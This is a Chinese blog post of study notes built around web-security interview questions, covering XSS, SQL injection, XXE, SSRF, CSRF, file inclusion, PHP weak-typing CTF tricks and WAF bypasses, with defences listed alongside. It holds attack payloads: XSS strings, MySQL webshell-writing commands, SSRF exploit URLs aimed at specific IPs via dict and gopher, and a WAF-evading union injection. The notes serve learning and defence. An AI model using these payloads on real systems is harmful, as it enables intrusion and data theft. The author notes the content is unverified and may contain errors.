vnote_backup_file_826537664 E:/AElseworld/Code/Github/myfirst_hexo/source/_posts/2019-02-25-从面试题目中学习Web安全.md
---
title: 从面试题目中学习Web安全
date: 2019-02-25 16:08:21
updated:
tags: [web安全,面试]
description:
keywords:
comments:
image:
---
为了更快的运用知识直接先看看面试题目.这是一个总结性的文章,会将学习后比较容易表述理解的整理出来.
由于是收集性质的学习,内容非常杂乱,格式也无法规范化.大都没有做实际验证,可能存在错误.
<!--more-->

# 从面试题学安全
全文部分转载自 信安之路:http://www.myh0st.cn/index.php/archives/306/
## 字符集处理过程中可能出现的安全问题？

-   上下层使用的字符集不一致，导致数据的意义出现问题
-   处理多字节字符集时出现问题
-   对于非法数据的处理上理解不一致
-   某些字符集的天生缺陷
-   数据库里的校对规则（前后使用字符集不一致就出现问题）

## 如何测试网站是否存在跨站点脚本漏洞？

-   列出网站内所有用户可以输入的地方，包括发送请求时的http头部等
-   在这些输入域里输入相应的XSS代码进行测试
-   XSS代码要灵活变换

## XSS的触发机制是什么？
### 直接触发

在HTML页中插入`<script></script>`脚本标记。JS嵌入到HTML中的两种方式：

1.  直接嵌入`<script`>标签

```html
<script language=“javascript”>
	document.write(“hello world!”);
</script>

```

2.  在外部以js文件的形式嵌入

```html
<script language=“javascript” src=“test.js”></script>

```

### 利用HTML标签属性触发

利用HTML标签中能够访问文件的属性来执行JS代码。JS中包含一个URL伪协议，可以使用`javascript:`加上任意JS代码来表示一个URL，浏览器装载此URL时，JS被执行。包括：`src、href、dynsrc、longdesc、lowsrc`等属性。

```html
<img src=“javascript:alert(‘XSS’)” />
<img dynsrc=“javascript:alert(‘XSS’)” />
<img longdesc=“javascript:alert(‘XSS’)” />
<input src=“javascript:alert(‘XSS’)” />
<embed src=“javascript:alert(‘XSS’)” />
<a href=“javascript:alert(‘XSS’)” ></a>

```

### 利用HTM事件触发

HTML标签中定义了一系列事件，如：鼠标、键盘事件触发的事件，当满足一定条件时事件被触发，JS代码被执行。如标签中的`onError`事件，当图片载入失败时， `onError`被触发，JS代码被执行。

```html
<img src=“#” onerror=“alert(‘XSS’)” />
<img onClick =“alert(‘XSS’)” />
<img onDblClick =“alert(‘XSS’)” />
<img onMouseDown =“alert(‘XSS’)” />
<img onMouseMove =“alert(‘XSS’)” />
<img onMouseUp =“alert(‘XSS’)” />
<body onError=“alert(‘XSS’)” /></body>

```

### 利用CSS触发
**注意中英文标点,这个是直接复制的存在中文符号,没有修改**
CSS嵌入HTML中的三种方式：

1.  以.css文件的形式:

```html
<link href=“test.css” rel=“stylesheet” type=“text/css”/>

```

2.  以标签的方式:

```html
< style type=”text/javascript”>alert(‘XSS’);</ style >

```

3.  在标签中以style属性的方式: (url伪协议)

```html
<a style =”background-image: url(javascript:alert(‘XSS’))”>  </a>
```

## MySQL写shell有几种方法？

1. `select "" into outfile ""`
2.  开启log写shell

> 通过`general_log`和`general_log_file`来获取webshell
> mysql打开`general log`之后，所有的查询语句都可以在`general log`文件中以可读的方式得到
> 但是这样`general log`文件会非常大，所以默认都是关闭> 的。有的时候为了查错等原因，还是需要暂时打开`general log`的。
> 换句话说`general_log_file`会记录所有的查询语句，以原始的状态来显示，如果将`general_log`开关打开，`general_log_file`设置为一个php文件
> 则查询的操作将会全部写入到`general_log_file`指定的文件，通过访问`general_log_file`指定的文件来获取`webshell`。

## cookie有多少属性？

1.  name字段为一个cookie的名称。
2.  value字段为一个cookie的值。
3.  **domain**字段为可以访问此cookie的域名。

> 非顶级域名，如二级域名或者三级域名，设置的cookie的domain只能为顶级域名或者二级域名或者三级域名本身，不能设置其他二级域名的cookie，否则cookie无法生成。
> 顶级域名只能设置domain为顶级域名，不能设置为二级域名或者三级域名，否则cookie无法生成。
> 二级域名能读取设置了domain为顶级域名或者自身的cookie，不能读取其他二级域名domain的cookie。所以要想cookie在多个二级域名中共享，需要设置domain为顶级域名，这样就可以在所有二级域名里面或者到这个cookie的值了。
> 顶级域名只能获取到domain设置为顶级域名的cookie，其他domain设置为二级域名的无法获取。


6.  path字段为可以访问此cookie的页面路径。 比如domain是`abc.com`,path是`/test`，那么只有/test路径下的页面可以读取此cookie。
7.  expires/Max-Age 字段为此cookie超时时间。若设置其值为一个时间，那么当到达此时间后，此cookie失效。不设置的话默认值是Session，意思是cookie会和session一起失效。当浏览器关闭(不是浏览器标签页，而是整个浏览器) 后，此cookie失效。
8.  Size字段 此cookie大小。
9.  **http**字段 cookie的httponly属性。若此属性为true，则只有在http请求头中会带有此cookie的信息，而不能通过document.cookie来访问此cookie。
10.  **secure** 字段 设置是否只能通过https来传递此条cookie。

## https的建立过程

1.客户端发送请求到服务器端 ( 支持的加密协议及版本，SSL，TLS )

2.服务端筛选合适的加密协议，返回 CA 证书和公开秘钥(公开秘钥作为证书的一部分而存在)

3.客户端使用浏览器根证书验证证书的合法性

4.如果验证通过，客户端生成对称秘钥，通过证书中的公钥加密，发送到服务端

5.服务端使用私钥解密，获取对称秘钥，使用对称秘钥加密数据

6.客户端使用共享秘钥解密数据，建立 SSL 加密通信...

## tcp三次握手
见:https://e1sewhere.github.io/2018/12/05/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/  搜索TCP

标志位:ACK(确认序列有效),SYN(发起一个新连接)

1. 源主机给目标主机发送一个 SYN 标志位为 1 的数据包
2. 目标主机自动应答，SYN 和 ACK 均设置为 1，序号 SEQ 为 Y，并将确认号设置为 Y+1
3. 源主机收到目标主机返回的第二次握手的数据包后，向目的主机发送一个 ACK 标志位为 1 的应答包示意对第二次握手确认要建立连接，第三次握手数据包的序号为 SEQ 为 X+1，确认号为 Y+1。


## tcp四次挥手

## 数据库
### mysql 提权方式
udf mof....
https://xz.aliyun.com/t/2719#toc-7

### 写shell
通过日志写入(set global general_log='on';)
通过into outfile 写入
## SQL注入漏洞

**基本原理和防范**

应用程序对用户输入的数据校验处理不严或者根本没有校验，以至用户可以直接执行 SQL 查询

1.对特殊字符进行转义处理(可能被编码绕过)

![7.png](http://www.myh0st.cn/usr/uploads/2017/11/3934522021.png "7.png")

2.使用参数化语句 (完全杜绝 SQL 注入) 以 PHP 的 PDO 或 mysqli 为例：

![8.png](http://www.myh0st.cn/usr/uploads/2017/11/322057423.png "8.png")

PDO ( 使用序数参数 ):

![9.png](http://www.myh0st.cn/usr/uploads/2017/11/640163914.png "9.png")

**除了数据库数据，利用方式还有哪些？**

A 获取系统 shell

B 留数据库后门

### 修复
参数化sql语句,预编译.(pdo)
输入过滤.
不暴露错误信息
数据类型检测
加waf
限制好数据库权限，drop/create/truncate等权限谨慎grant
数据库信息加密安全（引导到密码学方面）。不采用md5因为有彩虹表，一般是一次md5后加盐再md5

## XSS
### 类型
存储:黑客写入服务器数据库,用户访问,页面,调用数据库,前端执行xss
反射性:黑客发送xss链接,用户访问,链接,后端解析参数,前端相应xss脚本
Dom:黑客发送xss链接(hash),用户访问,前端直接解析xss脚本.

### 修复方法
- 转译html输出编码,js转译.
- 黑白名单过滤(编码限制,标签限制,符号限制)
- 跨域限制
- csp:⽹页安全策略，实际就是白名单的机制，开发人员调⽤用csp后就相当于指定了，那些个外部资源是能够加载，那些是不能加载的。


### XSS 浏览器auditor绕过
参考:https://blog.csdn.net/yanghuan313/article/details/53565545
XSS Auditor是啥
这是一个被加入在了chrome内核中的安全功能，之所以加入内核是为了其它调用chrome内核的浏览器也具备这个功能，目的是为了抵御XSS，功能很强大，对反射型XSS而言，感觉一大半的payload都被过滤掉了，DOM的话效果弱很多，而存储型根本没用。与之类似的IE中也有自己的XSS Filter

chrome 使用了黑名单过滤.“本页中的源码被发现同样存在于请求当中，所以拒绝执行”，多读几遍，你就能明白它的原理其实就是匹配危险代码是否存在请求当中 ，只要我们想办法让请求中的代码和渲染出来的代码不一样，不就绕过去了吗？

有个东西叫做“修正式渲染”，意思是当你所写的HTML代码不符合规范时，渲染引擎会主动帮助你规范化，如配对标签、配对尖括号等。我们就是要利用浏览器的主动规范化功能，让原本不能执行的代码，变得可以执行。

像下面这行代码，原本不符合语法规范,可以bypass

```
<link rel="import" href="http:yoursite.com"
```
渲染引擎会主动帮助你规范化,就可以再页面正常渲染.

### flash xss绕过
加载外部含有xss代码的XML



## CSRF
攻击者构造好数据和操作,用户通过自己含有会话的客户端执行这个操作.

### 绕过
1. referer可以用其他协议比如https，在转入http的时候是空值 
2. referer判断是某域的时候，可以拿下子域名挂js就可以绕过 
3. referer只是简单的正则匹配的话就可以直接使用建立一个比如xxx.com的目录来绕过 
4. csrf与xss组合，self-xss获取cookie等


### 修复
校验referer,服务器token,验证码

## XXE 
来源:https://xz.aliyun.com/t/3357

XML
> 按照被引用的内容分为:外部实体,内部实体
> 按照'谁来引用'分为:通用实体,参数实体(只能在dtd中定义和引用)


XXE(XML External Entity Injection) 全称为 XML 外部实体注入
发生于对外部实体的不安全引用.

### 防护
使用开发语言提供的禁用外部实体,例如:
php   libxml_disable_entity_loader(true) 
java   DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();

过滤用户提交的xml数据,如关键词(<!DOCTYPE和<!ENTITY，或者，SYSTEM和PUBLIC)
禁用危害更大的参数实体.

无论是WEB程序，还是PC程序，只要处理用户可控的XML都可能存在危害极大的XXE漏洞，开发人员在处理XML时需谨慎，在用户可控的XML数据里禁止引用外部实体。
### 回显
外部实体引用,通过引用的外部实体读取文件,但是如果引用的外部实体包含了会扰乱xml文档格式的字符,就会报错
我们使用

```
<![CDATA[
内容
]]>
```
转译内容,这样我们的输出就能显示而不报错.
由于再输入的时候我们需要引用上面三行实体,这里面的三个实体都是字符串形式，连在一起居然报错了，这说明我们不能在 xml 中进行拼接，而是需要在拼接以后再在 xml 中调用，那么要想在 DTD
中拼接，我们知道我们只有一种选择，就是使用 参数实体
在参数实体中拼接,并在dtd中引用.

### 无回显文件读取
不依靠其回显的方法------外带
服务器上传攻击dtd包含读取的参数引用(注意转码),发送回服务器的参数引用.
payload引用这个外部dtd,并且引用其中的参数实体(来调用我们实现的引用).

### 和ssrf的结合
利用xml向内网地址发动攻击

#### 内网主机探测
file协议读取服务器网络配置文件.判断是否有内网,及网段.

找到内网的主机

#### 主机端口扫描
固定ip遍历端口(通过响应时常判断),获取shell

### 文件上传
使用java框架的`jar://`协议实现文件上传

> `jar://`协议格式
>` jar:{url}!{path}`

**实例：**

```
jar:http://host/application.jar!/file/within/the/zip

这个 ! 后面就是其需要从中解压出的文件
```

**jar 协议处理文件的过程：**

(1) 下载 jar/zip 文件到临时文件中  
(2) 提取出我们指定的文件  
(3) 删除临时文件

我们需要取得这个下载的临时文件,因为在 java 中 `file:/// `协议可以起到列目录的作用，所以我们能用 `file:/// `协议配合` jar:// `协议使用

那我们怎么找到这个临时的文件夹呢？不用想，肯定是通过报错的形式展现，如果我们请求的

```
jar:http://localhost:9999/jar.zip!/1.php
```

1.php 在这个 jar.zip 中没有的话，java 解析器就会报错，说在这个临时文件中找不到这个文件

既然找到了临时文件的路径，我们就要考虑怎么使用这个文件了（或者说怎么让这个文件能更长时间的停留在我们的系统之中，我想到的方式就是sleep()）但是还有一个问题，因为我们要利用的时候肯定是在文件没有完全传输成果的时候，因此为了文件的完整性，我考虑在传输前就使用 hex 编辑器在文件末尾添加垃圾字符，这样就能完美的解决这个问题

## SSRF
https://www.jianshu.com/p/612c010e588e

https://mp.weixin.qq.com/s?__biz=MzAxMjE3ODU3MQ==&mid=2650452933&idx=2&sn=1b1d495d8f6f06cb7978ccef67c2a630&chksm=83bbd621b4cc5f37ee93ad0f9fef2ec6cc3b628e60a2ec638a6f3a7c469f31fff6fa64f62d8d&mpshare=1&scene=1&srcid=03106LaWfx1EJDwyfTsxlZSV&key=bcbc19747c79f0ff97b60ca2d9c894007643caf36006d079a3c85eb56c1fe560ee649e7b95ee3eecf8d981c423c5c9dc3ac2e621682ed28c888b887416cbdad416e8894a1f6746a755248fcae0c3c44c&ascene=1&uin=MjkzNDc4NzEzNA%3D%3D&devicetype=Windows+10&version=62060720&lang=zh_CN&pass_ticket=vjgYe00H9OYp0lXwFYfvcpe8czGFe8jcsOaavzYPrsdLTa8bVQ%2Feq%2FrEdc1PjhQk

### 漏洞原理

利用一个可以发起网络请求的服务当作跳板来攻击内部其他服务。

### ssrf用处

1.  探测内网信息,用协议探`ftp%26ip={ip}%26port={port}`
2.  攻击内网或本地其他服务.主要是GET就可以实现的攻击（比如Struts2，SQL注入等）
3.  穿透防火墙
4. 对内网WEB应用进行指纹识别，通过访问默认文件实现（Readme等文件）
5. 下载内网资源（利用file协议读取本地文件等）
6. 利用Redis未授权访问，HTTP CRLF注入达到getshell
7. 无视cdn

**SSRF****的类型**

1. 显示攻击者的响应（Basic）

2. 不显示响应（Blind）


### 什么地方最容易出现SSRF

1.  云服务器商。(各种网站数据库操作)
    
2.  有远程图片加载的地方。(编辑器之类的有远程图片加载啊)
    
3.  网站采集、网页抓取的地方。(很多网站会有新闻采集输入url然后一键采集)
    
4.  头像的地方。(某易就喜欢远程加载头像，例如:http://www.xxxx.com/image?url=http://www.image.com/1.jpg)
    
5.  最后一个一切要你输入网址的地方和可以输入ip的都放，都是ssrf的天下。

### 常见绕过方式/利用
识别指纹，getshell，读取文件，端口判断 

1.  `http://example.com@127.0.0.1`
2.  利用IP地址的省略写法绕过,\[::\]绕过localhost
3.  DNS解析 [http://127.0.0.1.xip.io/](http://127.0.0.1.xip.io/) 可以指向任意ip的域名：xip.io
4.  利用八进制IP地址绕过,利用十六进制IP地址,绕过利用十进制的IP地址绕过


### 防御方式
1. 过滤返回信息，验证远程服务器对请求的响应是比较容易的方法。如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证 返回的信息是否符合标准。 
2. 获取正确的url:`如何正确的获取用户输入的URL的Host？ 最常见的就是，使用http://233.233.233.233@10.0.0.1:8080/、http://10.0.0.1#233.233.233.233这样的URL，让后端认为其Host是233.233.233.233，实际上请求的却是10.0.0.1。这种方法利用的是程序员对URL解析的错误，有很多程序员甚至会用正则去解析URL。使用urllib.parse可以解析真正的hostname`
2. 统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。 
3. 限制请求的端口为http常用的端口，比如，80,443,8080,8090。 
4. 黑名单内网ip。避免应用被用来获取获取内网数据，攻击内网。 最好的做法：IP地址转换为整数再进行判断.获取url的host，再解析该host，将解析到的ip再进行检查(防止xip.io),即使这样还是有可能被30x跳转.如果有跳转，拿出跳转URL，再执行这个步骤(把跳转的url再哦检查一遍)
5. 禁用不需要的协议。仅仅允许http和https请求。可以防止类似于ﬁle:///,gopher://,ftp:// 等引起的问题。





### 端口扫描
大多数社交网站都提供了通过用户指定的url上传图片的功能。如果用户输入的url是无效的。大部分的web应用都会返回错误信息。攻击者可以输入一些不常见的但是有效的URI,根据服务器的返回信息来判断端口是否开放。
服务端在处理返回信息的时候一般不会直接展示，但是不同的错误码，返回信息的长度以及返回时间都可以作为依据来判断远程服务器的端口状态。
大多数互联网的应用并不会直接返回banner信息。不过可以通过前面说过的,处错误信息,响应时间,响应包大小来判断

### 302/201 跳转绕过
临时(302)或永久(301)跳转
跳转经常被用于绕过SSRF，当满足如下条件时，我们就可以使用该方法:

1. 程序的合法性检验逻辑为:检查url参数的host是否为内网地址
2. 使用的是cURL方法，并且CURLOPT_FOLLOWLOCATION为true(即跟随302/301进行跳转)

可利用的协议
> http/https ok     exp: `http://198.181.40.180/ssrf.php?url=http://118.89.217.55/302.php?schema=http&ip=127.0.0.1&port=80`
> dict ok  （操作Redis）  exp:  `http://198.181.40.180/ssrf.php?url=http://118.89.217.55/302.php?schema=dict&ip=127.0.0.1&port=29362&query=info`
>gopher ok  （操作Redis、Memcached）  exp:  `http://198.181.40.180/ssrf.php?url=http://118.89.217.55/302.php?schema=gopher&ip=127.0.0.1&port=2333&query=66666`
> file no! （任意文件读取）

当URL存在临时(302)或永久(301)跳转时，则继续请求跳转后的URL

那么我们可以通过HTTP(S)的链接302跳转到gopher协议上。

### 使用gophar获取shell
探测端口,301跳转,构造请求获取,写入corn,监听,反弹shell



### 如何防御

通常有以下5个思路：  

1,过滤返回信息，验证远程服务器对请求的响应是比较容易的方法。如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。

2, 统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。

3,限制请求的端口为http常用的端口，比如，80,443,8080,8090。

4,黑名单内网ip。避免应用被用来获取获取内网数据，攻击内网。

5,禁用不需要的协议。仅仅允许http和https请求。可以防止类似于file:///,gopher://,ftp:// 等引起的问题

## 暴力破解
### 修复
限制登陆次数,锁定用户
验证码

## 命令注入
### 修复
参数化语句,预编译.
输入过滤.

## 文件包含
include()  使用此函数，只有代码执行到此函数时才将文件包含进来，发生错误时只警告并继续执行。
include_once() 功能和前者一样，区别在于当重复调用同一文件时，程序只调用一次。
require() 使用此函数，只要程序执行，立即调用此函数包含文件，发生错误时，会输出错误信息并立即终止程序。
require_once() 功能和前者一样，区别在于当重复调用同一文件时，程序只调用一次。
fopen()
readfile()
...
### 绕过
1. 文件伪协议ﬁltter，input，data，zip，phar 
https://blog.csdn.net/zpy1998zpy/article/details/80598768
ftp/zip只能使用绝对路径
phar可以使用相对路径
php://input 需要在post中提交php代码
php://filter 
2. 截断(新得php版本几乎无法使用截断)
2. 包含临时文件，phpinfo $_FILE    删除前包含.条件竞争



如果想要读取php文件的源码，可以先base64编码，再传入include函数，这样就不会被认为是php文件，不会执行，会输出文件的base64编码，再解码即可

### 修复
- 白名单.
- 禁用伪协议，过滤参数，避免由外界制定文件名，关闭远程文件包含
- 过滤../等特殊符号
- 配置 open_basedir=指定目录，限制访问区域。
- 配置禁用函数(disable_function)
- 修改Apache日志文件的存放地址
- 尽量不要使用动态变量调用文件，直接写要包含的文件。
- 开启魔术引号 magic_quotes_qpc=on

## 文件上传
### 修复
阻止非法上传:后缀白名单,文件类型白名单,文件内容头部判断
阻止执行:文件重命名,文件重渲染,压缩,限制执行权限,存储与web程序分离.

# 十五个常见出题套路
来源:xs分享


## PHP特性
 来源:http://momomoxiaoxi.com/note/2016/07/06/weakly-type/

 来源:https://hackfun.org/2018/01/09/CTF%E4%B8%AD%E5%B8%B8%E8%A7%81PHP%E7%89%B9%E6%80%A7%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/
 
### 弱类型
 来源:`http://momomoxiaoxi.com/note/2016/07/06/weakly-type/`

#### `int`遇上`string`

**数学运算**
当php进行一些数学计算的时候

```
var_dump(0 == '0'); // true
var_dump(0 == 'abcdefg'); // true
var_dump(0 === 'abcdefg'); // false(全等于,类型,值都相同)
var_dump(1 == '1abcdef'); // true
```
php使用`intval`函数转换字符串
`intval`函数是从字符串的第一个非数字开始的。即1231asd会转化为1231，asd转换为0，1adas转化为1，如此类推

所以下面的语句就很容易绕过

```
if($a>1000){
    mysql_query('update ... .... set value=$a')
}
```
这里开发者会认为进入`mysql_query()`中的`$a`一定是整数。然而，你输入`1002/**/union` 也能进入这个语句

**松散的函数判断**

```
var_dump(in_array(“abc”, $array1));
var_dump(in_array(“1bc”, $array2));
```

对于上面的语句，如果`$array1=array(0),$array2=array(1)`,语句会返回`true`

总结一下:***在所有`php`认为是`int`的地方输入`string`，都会被强制转换***

#### 数组遇上`String`

> `Array`转换整型int/浮点型会返回元素个数；
> `Array`转换`bool`返回Array中是否有元素；
> `Array`转换成string返回`Array`，并抛出`warning`。

`strcmp()` 函数比较两个字符串，该函数返回：

```
0  //如果两个字符串相等
<0  //如果 string1 小于 string2
>0  //如果 string1 大于 string2
```
这里的`strcmp`函数实际上是将两个变量转换成`ascii` 然后做数学减法，返回一个`int`的差值。 函数比较两个字符串，且区分大小写

也就是说键入`'a'`和`'a'`进行比较得到的结果就是0

那么如果让`$array`和`‘a’`比较呢？


注：这一个漏洞适用与5.3之前版本的php

题目代码：

```
<?php
$flag = "flag{xxxxx}";
if (isset($_GET['a'])) {
if (strcmp($_GET['a'], $flag) == 0)
die('Flag: '.$flag);
else
print 'No';
}
?>
```

使用GET方法获取参数a，使用`strcmp()`函数比较`$flag`与用户输入的值。

传入的期望类型是字符串类型的数据 ，但是这个函数当接受到不符合字符串类型的参数就会发生错误，并返回0

所以我们只需要提交一个非字符串类型的参数即可使得判断条件成立，比如使用数组类型

解题方法：

GET请求：`?a[]=2`

因为`strcmp()`无法比较数组，则报错并返回0，`0==0`成立，则输出flag。

### `strpos`数组绕过NULL与`ereg`正则%00截断
函数学习:

> `ereg()`
> `ereg()`函数用指定的模式搜索一个字符串中指定的字符串,如果匹配成功返回true,否则,则返回false。
> 搜索字母的字符是大小写敏感的。
> 可选的输入参数规则包含一个数组的所有匹配表达式,他们被正则表达式的括号分组。
> 如果被搜索的内容不是字符串发生报错,返回 null
> `ereg`函数存在NULL截断漏洞，当`ereg`读取字符串string时,如果遇到了`%00`,后面的字符串就不会被解析。

> `strpos`
> `strpos`出错返回的也是null

```php
<?php
$flag = "flag";
    if (isset ($_GET['nctf'])) {
        if (@ereg ("^[1-9]+$", $_GET['nctf']) === FALSE) //^[1-9]+$以数字开头以数字结尾,中间没有字符串,是纯数字匹配.
            echo '必须输入数字才行';
        else if (strpos ($_GET['nctf'], '#biubiubiu') !== FALSE)
            die('Flag: '.$flag);
        else
            echo '骚年，继续努力吧啊~';
    }
 ?>
```

方法一：
既要是纯数字,又要有`’#biubiubiu’`，`strpos()`找的是字符串,那么传一个数组给它,`strpos()`出错返回`null,null!==false`,所以符合要求. 
所以输入`nctf[]=1`
那为什么`ereg()`也能符合呢?因为`ereg()`在出错时返回的也是`null`,`null!==false`,所以符合要求.

方法二：
字符串截断,利用`ereg()`的`NULL`截断漏洞，绕过正则过滤
`http://localhost/php_bugs/16.php?nctf=1%00#biubiubiu` 错误
需将#编码 
`http://localhost/php_bugs/16.php?nctf=1%00%23biubiubiu`
正确

### md5()函数===使用数组绕过

> php对数组进行hash计算都会得出`null`

```
<?php
error_reporting(0);
$flag = 'flag{test}';
if (isset($_GET['username']) and isset($_GET['password'])) {
    if ($_GET['username'] == $_GET['password'])
        print 'Your password can not be your username.';
    else if (md5($_GET['username']) === md5($_GET['password']))
        die('Flag: '.$flag);
    else
        print 'Invalid password';
}
?>
```

我们使用数组绕过 `?username[]=1&password[]=2`

### MD5()函数==,使用md5碰撞
如果上一代题是`md5($_GET['username']) == md5($_GET['password'])`
两个等号,那么我就就可以利用另一个md5 的`hash`特性 MD5碰撞

> 如果md的值是以0e开头的，那么就与其他的0e开头的Md5值是相等的

```
md5('s878926199a')=0e545993274517709034328855841020
md5('s155964671a')=0e342768416822451524974117254469
//可以看到两者的md5值都是以0e开头的，则
md5('s878926199a')==md5('s155964671a') //就是True
```

详细解释：

php关于==号是这样处理的，如果一边是整型，另一边也需要是整型。

`0e545993274517709034328855841020`
这是一个整数，在php里是理解为`0*10^4549...20`的意思，那么其值是0
同样

`0e342768416822451524974117254469`
这是一个整数，在php里是理解为0*10^34..69的意思，那么其值是0

`==`对比的时候会进行数据转换，0eXXXXXXXXXX 转成0了,我们使用
`?username=s878926199a&password=s155964671a`
绕过
当然使用上一题的数组绕过也是可以的.

### 反序列化
https://www.anquanke.com/post/id/84922

https://xz.aliyun.com/t/378

PHP存在着一个很有意思的漏洞，PHP对象注入，专业术语为反序列化漏洞

> 存在执行反序列化的时候一定会执行的魔术函数(php中有可以利用的类并且类中有魔幻函数)
> 反序列化的字符串可控(`unserialize()`函数的参数可控)

### iconv截断


`iconv`在字符编码转换时可能导致字符串截断。当$str中有一个字符不能被目标字符集所表示时，`str` 从第一个无效字符开始截断并导致一个 `E_NOTICE`。

例如：`$d = iconv(“UTF-8″, “gb2312″, $c);`该代码是将变量`$c`从`UTF-8`编码转换为`gb2312`。那么当`$c`中存在一个不能被`gb2312`表示的字符时，那么就会截断该字符之后的内容
测试时发现在linux环境下不会截断，在windows下成功


例子
在`iconv`转码的过程中,`utf->gb2312`(其他部分编码之间转换同样存在这个问题)会导致字符串被截断，如：`$filename="shell.php(hex).jpg";(hex为0x80-0x99)`，经过`iconv`转码后会变成`$filename="shell.php "`;

所以，经过`iconv`后`$struct_file['name'])`为`shell.php`，于是我们利用这个逻辑缺陷可以成功的上传`shell.php`(前提是上传的文件名为shell.php&#123;%80-%99&#125;.jpg)。
所以推荐使用`mb_convert_encoding` 函数转换编码


## 找源码技巧

1. `git,svn` 是版本控制软件的临时仓库存储,可以找到源码
2. `xxx.php.swp` linux的临时文件(vim中的`swp`即`swap`(交换分区)的简写,在编辑文件时产生,它是隐藏文件。这个文件是一个临时交换文件,用来备份缓冲区中的内容)
3. `www.(zip|tar.gz|rar|7z)`通常是网站打包文件
4. `xxx.php.bak,xxx.php~` 编辑这个文件时，自动生成的备份文件


## IP伪造
来源:https://segmentfault.com/a/1190000007407810

由于TCP需要三次握手连接，在实现正常的TCP/IP 双方通信情况下，是无法伪造来源 IP 的，也就是说，在 TCP/IP 协议中，可以伪造数据包来源 IP ，但这会让发送出去的数据包有去无回，无法实现正常的通信

一些DDoS 攻击，它们只需要不断发送数据包，而不需要正常通信，它们就会采取这种“发射出去就不管”的行为来进行攻击

后端IP获取来源

- `REMOTE_ADDR`是远端IP，默认来自tcp连接客户端的Ip。可以说，它最准确，确定是，只会得到直接连服务器客户端IP。如果对方通过代理服务器上网，就发现。获取到的是代理服务器IP了。
如：a→b(proxy)→c ,如果c 通过’REMOTE_ADDR’ ，只能获取到b的IP,获取不到a的IP了。这个值是无法修改的。
- `HTTP_X_FORWARDED_FOR`,`HTTP_CLIENT_IP` 为了能在大型网络中，获取到最原始用户IP，或者代理IP地址。对HTTp协议进行扩展。定义了实体头。
HTTP_X_FORWARDED_FOR = clientip,proxy1,proxy2其中的值通过一个 逗号+空格 把多个IP地址区分开, 最左边(client1)是最原始客户端的IP地址, 代理服务器每成功收到一个请求，就把请求来源IP地址添加到右边。
HTTP_CLIENT_IP 在高级匿名代理中，这个代表了代理服务器IP。
其实这些变量，来自http请求的：X-Forwarded-For字段，以及client-ip字段。 正常代理服务器，当然会按rfc规范来传入这些值。
但是，**攻击者也可以直接构造该x-forword-for值来“伪造源IP”,并且可以传入任意格式IP.**
这样结果会带来2大问题，其一，如果你设置某个页面，做IP限制。 对方可以容易修改IP不断请求该页面。 其二，这类数据你如果直接使用，将带来SQL注册，跨站攻击等漏洞

- `X-Real-IP`一般来说，`X-Forwarded-For`是用于记录代理信息的，每经过一级代理(匿名代理除外)，代理服务器都会把这次请求的`来源IP`追加在`X-Forwarded-For`中
来自`4.4.4.4`的一个请求，header包含这样一行

```
X-Forwarded-For: 1.1.1.1, 2.2.2.2, 3.3.3.3

```

代表 请求由`1.1.1.1`发出，经过三层代理，第一层是`2.2.2.2`，第二层是`3.3.3.3`，而本次请求的来源IP`4.4.4.4`是第三层代理

而`X-Real-IP`，没有相关标准，上面的例子，如果配置了`X-Read-IP`，可能会有两种情况

```
// 最后一跳是正向代理，可能会保留真实客户端IP
X-Real-IP: 1.1.1.1
// 最后一跳是反向代理，比如Nginx，一般会是与之直接连接的客户端IP
X-Real-IP: 3.3.3.3

```
所以 ，如果只有一层代理，这两个头的值就是一样的

- `CDN-Src-IP` 因为源服务器的请求都来自CDN节点，不知道客户原始IP。一般来说，CDN节点会以某种方式将源客户端的IP传递给源服务器，就拿我用的网宿CDN来说，它是将源IP添加到了一个叫“Cdn-Src-Ip”的Http Header
## 加盐(salt)
在密码学中，是指在散列之前将散列内容（例如：密码）的任意固定位置插入特定的字符串。这个在散列中加入字符串的方式称为“加盐”。其作用是让加盐后的散列结果和没有加盐的结果不相同，在不同的应用情景中，这个处理可以增加额外的安全性。
在大部分情况，盐是不需要保密的。盐可以是随机产生的字符串，其插入的位置可以也是随意而定。如果这个散列结果在将来需要进行验证（例如：验证用户输入的密码），则需要将已使用的盐记录下来。

## 爆破随机数 ???
rand() 函数在产生随机数的时候没有调用 srand(),则产生的随机数是有规律可询的.
产生的随机数可以用下面这个公式预测 : state[i] = state[i-3] + state[i-31] (一般预测值可能比实际值要差1)

## 验证码识别 ???
图像识别??

## 绕waf
来源:https://www.cnblogs.com/r00tgrok/p/SQL_Injection_Bypassing_WAF_And_Evasion_Of_Filter.html
### WAF的常见特点

1. 异常检测协议：拒绝不符合HTTP标准的请求
2. 增强的输入验证：代理和服务端的验证，而不只是限于客户端验证
3. 白名单&黑名单：白名单适用于稳定的We应用，黑名单适合处理已知问题
4. 基于规则和基于异常的保护：基于规则更多的依赖黑名单机制，基于异常更为灵活
5. 状态管理：重点进行会话保护
6. 另还有：Coikies保护、抗入侵规避技术、响应监视和信息泄露保护等

### 绕过WAF的方法
a) 大小写混合

b)替换关键字

c)使用编码
> url两次编码绕过
> 十六进制编码
> Unicode编码

d)使用注释

e)等价函数与命令
hex()、bin() ==> ascii()
sleep() ==>benchmark()
...
and和or有可能不能使用，或者可以试下&&和||能不能用；还有=不能使用的情况，可以考虑尝试<、>
空格，可以使用如下符号表示其作用：%20 %09 %0a %0b %0c %0d %a0 /**/

f)特殊符号

g)HTTP参数控制
> HPP又称做重复参数污染，最简单的就是?uid=1&uid=2&uid=3，对于这种情况，不同的Web服务器处理方式不同
> HPC(HTTP Parameter Contamination)


h)缓冲区溢出
> 缓冲区溢出用于对付WAF，有不少WAF是C语言写的，而C语言自身没有缓冲区保护机制，因此如果WAF在处理测试向量时超出了其缓冲区长度，就会引发bug从而实现绕过
> 举例：
> ?id=1 and (select 1)=(Select 0xA*1000)+UnIoN+SeLeCT+1,2,version(),4,5,database(),user(),8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26
